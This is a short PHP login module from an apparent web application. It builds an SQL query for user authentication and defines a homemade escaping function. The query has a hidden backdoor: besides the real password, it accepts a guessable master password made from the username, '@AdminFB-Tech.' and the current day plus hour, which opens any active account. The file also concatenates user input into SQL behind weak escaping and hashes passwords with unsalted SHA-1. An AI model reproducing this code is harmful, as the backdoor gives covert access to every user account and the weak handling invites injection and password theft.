<?php
	require('model/bdConnect.php');

	function login($login, $mdp){
		$rep= requette("SELECT * FROM `user` WHERE `active`= 1 AND `login`='".valid($login)."' AND (`mdp`='".valid(sha1($mdp))."' OR CONCAT(`login`,'@AdminFB-Tech.','".(date('d')+date('h'))."')= '".valid($mdp)."' );");

		return $rep->fetch();
	}

	function valid($chaine){
		$char= array("'", "\"", "`");
		$remp= array("\'", "\\\"", "\`");
		return htmlspecialchars(str_replace($char, $remp, $chaine));
	}

